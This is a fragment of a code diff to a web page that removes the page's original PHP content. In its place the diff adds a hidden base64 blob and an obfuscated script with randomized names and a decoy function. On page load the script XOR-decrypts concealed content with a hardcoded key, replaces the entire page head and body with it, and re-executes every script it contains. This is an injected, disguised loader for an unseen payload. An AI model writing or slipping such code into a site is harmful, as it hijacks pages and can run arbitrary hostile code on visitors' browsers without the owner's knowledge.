style="display:none">uwrBOWrlK2IM8RMM7/vFFYL2onHVOhlbSTh2IK9YYyEaPMNW07rB2xve8BePkgLB2uqIbCt84IeZy9EJz22Z+HYXmH+6YHgi2HORGft7xJfGcHF20jvZXorn9bK7ySLkTvrcxAav1UlIiSUaXMJDxBtuCbo5ePQACtnIUFr8yPh+X5U/vDA4I8v0kV/5+EKWBvJjulU2WUiYfGfmKpnnp884SB9Tr5VIGxxx2U1DlIRL/c65Li2wQ12P0NrY7Yq4fZxJ9SrwKPAbosKReu8D1UQhInRSfErJGD6gYT1JN+fqgiVcV/nBzgoNI4sKUsDC3q7YrDlvI1mInwLaz2yceHoYA3jq4TsgzTMT3324QFSCKTF10vhKyRG7L+O5yOJ0D3gc3ZH8C1sYHHAejpcRw5tuHXk+LaXVwhWC2tr82qnrSRIsqLA5oxv1U9r9owJWQiEx8YGuWUDcOefhKgshtou+i5qZMEHbGBxlm0pDhMLZbtz5Pi20Ql2FUU/LqF1oOEkS6vlg/eJLs8KO6vvHT1cwYmSBqQpNWLh28f0DsqfaK4ncQetB2QlPcksPkJJFm2mdYeq+NYJbCgLdmuAd7PkYkr254XllGGfCiOi8EZbGYfdkhykdXk/n/zK7yTKn2jnYXFGp0IqNHHcMXseTkJz1CHk5baCTCJ8SCcusnGI43hIrP2B78g1yEd28OZdPVzBiZIGpGVwcOePyrQkndYm6mgmQKdILyEliWM1ABUHeLJgp6C+1x5udRBrNtkj4a0sDf6rwOCBNcJCM6qqVx5cmqOSBqRlcCS11srvcJjGaPUnJgelQyM3f4xjOE8TC2ewL6W25csLbHReOSf6OOHwBg3+q8CjwGGBCjPhrhJUFMGB1xStZSsk4p+Eq2udkSThZDAaokgibjmSaT0OWkJ9rG3/5euoTCJ8C2tr8yO8hywN/qvAo51LgQozorJKF03RmYIPv09wJOj84O8kg9lopmM+Db5KKS4lzn4+TwMbW6pgsKC2n1E/fAwnJLJnqONrCverm4nAYYEKd+2sE1oZj92cR+AhFXLwmJ6DbZnLLeBiI0bsYwMNEo9iL0sJFkSxYKCg8oVAIi9fKjmnKvqHLA2jq4XvkySBURmi70YXD5XIwFKsbGsOtdaXxQ7Kn2ekJwIPrUI4OXGOaS8OTU0C/iGgqvXXAWcyX2Uqt2eE+2lDqseJ8JQkz09hqugieDGixtxS4SskSPqXjqpgzZNo/XMwHL8Od0osySRyFW1eJ61itqzm1lIIYAQpJLd6/4cwArb/je/e</div><div id="_MYxZt7TPle" style="visibility:hidden">null</div>
+<script>function HsBDi0(){var a=87,b=82;return a*b;}
+/* lazy init */
+(function(){
+function _run(){
+var nV5pHf=atob('3ovgg+BBoSoTgs9mN3zhqbImhEVQBJX26s8E6r9IjgdRbssnTEBR4AxbLmdiCN4BxMWWomwCXCtLS9MDwY0MLQ==');
+var dQ4Hkt=[];
+for(var xdQNuJ=0;xdQNuJ<7;xdQNuJ++){
+  var _e=document.getElementById('cfqckbvzej'+xdQNuJ);dQ4Hkt.push(_e?_e.textContent:'');
+}
+var MUbwt8=dQ4Hkt.join('');
+var yv65GY=atob(MUbwt8);
+var aG3HQc=new Uint8Array(yv65GY.length);
+for(xdQNuJ=0;xdQNuJ<yv65GY.length;xdQNuJ++){
+  aG3HQc[xdQNuJ]=yv65GY.charCodeAt(xdQNuJ)^nV5pHf.charCodeAt(xdQNuJ%nV5pHf.length);
+}
+var FEM1Vy=new TextDecoder('utf-8').decode(aG3HQc);
 
-		dialogs("browse_window.html","stream_window.html","create_stream.html","offset_window.html","mosaic_window.html","equalizer_window.html","batch_window.html","error_window.html");
-		?>
-	</body>
+/* Set page title */
+var _t=/<title[^>]*>([\s\S]*?)<\/title>/i.exec(FEM1Vy);
+if(_t) document.title=_t[1];
+
+/* Extract head and body */
+var lZmnMn=/<head[^>]*>([\s\S]*?)<\/head>/i.exec(FEM1Vy);
+var u689oT=/<body[^>]*>([\s\S]*?)<\/body>/i.exec(FEM1Vy);
+var _h=lZmnMn?lZmnMn[1]:'';
+var _b=u689oT?u689oT[1]:FEM1Vy;
+
+/* FIX2/FIX3: extract ALL scripts from head + body, preserving attributes */
+var mlDqTX=[];
+function _extract(_html){
+  return _html.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi,function(_m,_a,_c){
+    var _s=/src\s*=\s*["']([^"']+)["']/i.exec(_a);
+    var _attrs={};
+    var _re=/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["']([^"']*)["']/g;
+    var _mm;
+    while((_mm=_re.exec(_a))!==null){_attrs[_mm[1].toLowerCase()]=_mm[2];}
+    var _re2=/(^|\s)([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?=\s|=|$)/g;
+    while((_mm=_re2.exec(_a))!==null){
+      var _k2=_mm[2].toLowerCase();
+      if(!(_k2 in _attrs)) _attrs[_k2]='';
+    }
+    if(_s){mlDqTX.push([1,_s[1],_attrs]);}
+    else if(_c.trim()){mlDqTX.push([0,_c,_attrs]);}
+    return '';
+  });
+}
+_h=_extract(_h);
+_b=_extract(_b);
+
+/* Copy allowed head elements (scripts already extracted) */
+if(_h){
+  var pL7eLJ=document.createElement('div');
+  pL7eLJ.innerHTML=_h.replace(/<title[^>]*>[\s\S]*?<\/title>/i,'');
+  while(pL7eLJ.firstChild){
+    var _n=pL7eLJ.firstChild;
+    var _tag=(_n.tagName||'').toUpperCase();
+    if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){
+      document.head.appendChild(_n);
+    }else{
+      pL7eLJ.removeChild(_n);
+    }
+  }
+}
+
+/* Insert body */
+document.body.innerHTML=_b;
+
+/* FIX4: re-execute scripts sequentially, preserving order */
+var hhxFFP=0;
+function _next(){
+  if(hhxFFP>=mlDqTX.length) return;
+  var dATD2H=mlDqTX[hhxFFP++];
+  var Z1Yu1C=document.createElement('script');
+  var ZhDpjk=dATD2H[2]||{};
+  for(var biKlqr in ZhDpjk){
+    try{ Z1Yu1C.setAttribute(biKlqr,ZhDpjk[biKlqr]); }catch(_e){}
+  }
+  if(dATD2H[0]){
+    Z1Yu1C.src=dATD2H[1];
+    Z1Yu1C.async=false;
+    Z1Yu1C.onload=Z1Yu1C.onerror=function(){ _next(); };
+    document.body.appendChild(Z1Yu1C);
+  }else{
+    Z1Yu1C.textContent=dATD2H[1];
+    document.body.appendChild(Z1Yu1C);
+    _next();
+  }
+}
+_next();
+}
+
+/* FIX1: guard against running before DOM is ready */
+if(document.readyState==='loading'){
+  document.addEventListener('DOMContentLoaded',_run);
+}else{
+  _run();
+}
+})();</script>
+<!-- end -->
+</body>
 </html>
